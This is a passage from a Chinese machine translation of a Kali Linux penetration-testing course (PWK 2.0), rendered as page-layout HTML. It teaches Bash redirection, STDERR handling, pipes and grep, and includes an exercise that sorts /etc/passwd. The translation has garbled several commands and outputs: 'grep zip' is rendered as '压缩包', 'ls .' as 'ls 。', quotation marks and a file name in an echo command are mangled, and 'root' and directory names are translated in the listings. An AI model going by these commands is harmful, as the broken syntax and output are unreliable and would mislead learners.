<div style="position:absolute;top:62537;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.1 重定向到新文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的命令示例中，输出被打印到屏幕上。</font><font style="vertical-align: inherit;">这个最方便</font></font></nobr></div>
<div style="position:absolute;top:62595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间，但我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运算符将输出保存到文件中以供将来参考</font></font></nobr></div>
<div style="position:absolute;top:62614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或操纵：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:62666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面文档下载音乐图片公共模板视频</font></font></nobr></div>
<div style="position:absolute;top:62700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "test"</font></font></font></b></nobr></div>
<div style="position:absolute;top:62717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试</font></font></nobr></div>
<div style="position:absolute;top:62751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "test" &gt; redirection_test.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:62785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:62802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面文档下载音乐图片公共redirection_test.txt模板</font></font></nobr></div>
<div style="position:absolute;top:62836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat redirection_test.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:62853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试</font></font></nobr></div>
<div style="position:absolute;top:62887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "Kali Linux 是一个开源项目" &gt; redirection_test.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:62920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat redirection_test.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:62937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 是一个开源项目</font></font></nobr></div>
<div style="position:absolute;top:62957;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 38 - 将输出重定向到文件 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:63139;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="54"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 54 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:63172;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:64249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:64249;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:64249;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">54</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 38 所示，如果我们将输出重定向到一个不存在的文件，则会创建该文件</font></font></nobr></div>
<div style="position:absolute;top:63287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动地。</font><font style="vertical-align: inherit;">但是，如果我们将输出保存到一个已经存在的文件中，该文件的内容将是</font></font></nobr></div>
<div style="position:absolute;top:63306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取代。</font><font style="vertical-align: inherit;">小心重定向！</font><font style="vertical-align: inherit;">没有撤销功能！</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63341;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.2 重定向到现有文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要将附加数据附加到现有文件（而不是覆盖文件），请使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运算符：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo“由进攻性安全维护和资助”&gt;&gt;重定向</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63431;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_test.txt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat redirection_test.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:63482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 是一个开源项目</font></font></nobr></div>
<div style="position:absolute;top:63499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由进攻性安全部门维护和资助</font></font></nobr></div>
<div style="position:absolute;top:63518;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 39 - 将输出重定向到现有文件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63549;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.3 从文件重定向</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可能已经猜到了，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作符以“另一种方式”发送数据。</font><font style="vertical-align: inherit;">在下面的</font></font></nobr></div>
<div style="position:absolute;top:63607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们</font><font style="vertical-align: inherit;">使用直接来自我们的文件的数据</font><font style="vertical-align: inherit;">重定向</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDIN</font></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:63626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上一节中生成。</font><font style="vertical-align: inherit;">让我们用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc -m</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来计算文件中的字符数：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc -m &lt; redirection_test.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:63678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">89</font></font></nobr></div>
<div style="position:absolute;top:63697;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 40 - 使用 &lt; 操作符提供 wc 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，这有效地将我们文件的内容“连接”到</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">wc -m</font></font></b><font style="vertical-align: inherit;">的标准输入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:63746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63780;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.4 重定向 STDERR</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据POSIX </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">54</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明书中，文件描述符</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">55</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDIN</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDOUT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDERR</font></font></i></nobr></div>
<div style="position:absolute;top:63838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别定义为 0、1 和 2。</font><font style="vertical-align: inherit;">这些数字很重要，因为它们可用于</font></font></nobr></div>
<div style="position:absolute;top:63857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在执行或加入时从命令行操作相应的数据流</font></font></nobr></div>
<div style="position:absolute;top:63877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的命令在一起。</font></font></nobr></div>
<div style="position:absolute;top:63909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了更好地掌握文件描述符编号的工作方式，请考虑以下重定向的示例</font></font></nobr></div>
<div style="position:absolute;top:63929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准错误（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDERR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls 。</font></font></font></b></nobr></div>
<div style="position:absolute;top:63980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面文档下载音乐图片公共redirection_test.txt模板</font></font></nobr></div>
<div style="position:absolute;top:64014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls ./test</font></font></font></b></nobr></div>
<div style="position:absolute;top:64031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls: 无法访问“/test”: 没有那个文件或目录</font></font></nobr></div>
<div style="position:absolute;top:64065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls ./test 2&gt;error.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:64099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat error.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:64116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls: 无法访问“/test”: 没有那个文件或目录</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:64179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">54 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/POSIX</font></font></font></nobr></div>
<div style="position:absolute;top:64199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">55 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/File_descriptor</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:64327;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="55"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 55 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64360;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:65437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:65437;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:65437;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">55</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64456;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 41 - 将 STDERR 重定向到文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，在清单 41 中， error.txt 仅包含错误消息（在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDERR 上</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成</font><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">我们做到了</font></font></nobr></div>
<div style="position:absolute;top:64504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是通过将流编号添加到“&gt;”运算符（2= </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDERR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）来实现的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64539;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.5 配管</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的示例</font><font style="vertical-align: inherit;">，让我们看看如何重定向输出</font></font></nobr></div>
<div style="position:absolute;top:64596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从一个命令到另一个命令的输入。</font><font style="vertical-align: inherit;">考虑这个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat error.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:64648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls: 无法访问“/test”: 没有那个文件或目录</font></font></nobr></div>
<div style="position:absolute;top:64682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat error.txt | </font><font style="vertical-align: inherit;">wc -m</font></font></font></b></nobr></div>
<div style="position:absolute;top:64699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53</font></font></nobr></div>
<div style="position:absolute;top:64733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat error.txt | </font><font style="vertical-align: inherit;">wc -m &gt; count.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:64767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat count.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:64784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53</font></font></nobr></div>
<div style="position:absolute;top:64803;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 42 - 将 cat 命令的输出通过管道传输到 wc</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 42 中，我们使用管道字符 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的输出重定向</font><font style="vertical-align: inherit;">到输入</font></font></nobr></div>
<div style="position:absolute;top:64852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WC</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">这个概念可能看起来微不足道，但将不同的命令组合在一起是一个</font></font></nobr></div>
<div style="position:absolute;top:64872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理各种数据的强大工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64906;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sort</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结合使用</font><font style="vertical-align: inherit;">重新排序/etc/passwd的内容</font></font></nobr></div>
<div style="position:absolute;top:64955;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 系统上的文件。</font></font></nobr></div>
<div style="position:absolute;top:64984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将上一个练习的输出重定向到您在主目录中选择的文件。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:65021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3 文本搜索和操作</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将通过介绍一些命令来提高文件和文本处理的效率：</font></font></nobr></div>
<div style="position:absolute;top:65082;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">其中一些工具的高级用法需要很好地理解</font></font></nobr></div>
<div style="position:absolute;top:65101;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正则表达式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">regex</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">如何</font><font style="vertical-align: inherit;">工作。</font><font style="vertical-align: inherit;">一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正则表达式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是用于描述一个特殊的文本字符串</font></font></nobr></div>
<div style="position:absolute;top:65120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索模式。</font><font style="vertical-align: inherit;">如果您不熟悉正则表达式，请先访问以下网址</font></font></nobr></div>
<div style="position:absolute;top:65140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续：</font></font></nobr></div>
<div style="position:absolute;top:65173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:65173;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://www.rexegg.com/</font></font></nobr></div>
<div style="position:absolute;top:65201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:65201;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://www.regular-expressions.info/</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:65235;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.1 grep</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简而言之，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 56 在</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文本文件中搜索给定正则表达式的出现并输出</font></font></nobr></div>
<div style="position:absolute;top:65293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含与标准输出（通常是终端屏幕）匹配的任何行。</font><font style="vertical-align: inherit;">一些</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:65387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">56 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(die.net, 2010), https://linux.die.net/man/1/grep</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:65515;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="56"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 56 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:65548;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:66625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:66625;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:66625;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">56</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最常用的开关包括</font><font style="vertical-align: inherit;">用于递归搜索的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font><font style="vertical-align: inherit;">用于忽略文本大小写的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:65663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑以下示例：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:65698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -la /usr/bin | </font><font style="vertical-align: inherit;">压缩包</font></font></font></b></nobr></div>
<div style="position:absolute;top:65715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 3 根 34480 2017 年 1 月 29 日 bunzip2</font></font></nobr></div>
<div style="position:absolute;top:65732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 3 根 34480 2017 年 1 月 29 日 bzip2</font></font></nobr></div>
<div style="position:absolute;top:65749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 13864 2017 年 1 月 29 日 bzip2recover</font></font></nobr></div>
<div style="position:absolute;top:65766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 2 根 2301 2016 年 3 月 14 日 gunzip</font></font></nobr></div>
